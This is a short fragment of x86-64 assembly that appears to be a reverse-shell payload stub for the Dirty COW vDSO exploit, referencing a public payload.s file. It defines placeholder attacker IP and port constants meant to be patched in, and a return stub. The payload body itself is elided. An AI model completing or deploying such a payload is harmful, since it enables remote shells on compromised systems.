		...
		[SECTION .text]
		global _start
;; ref to https://github.com/scumjr/dirtycow-vdso/blob/master/payload.s
...
IP		equ 0xdeadc0de	;; patched by SPE
PORT		equ 0x1337	;; patched by SPE
...
return:
		...
		pop     rsi
		pop     rdi
		;; execute missed instructions (patched by SPE)
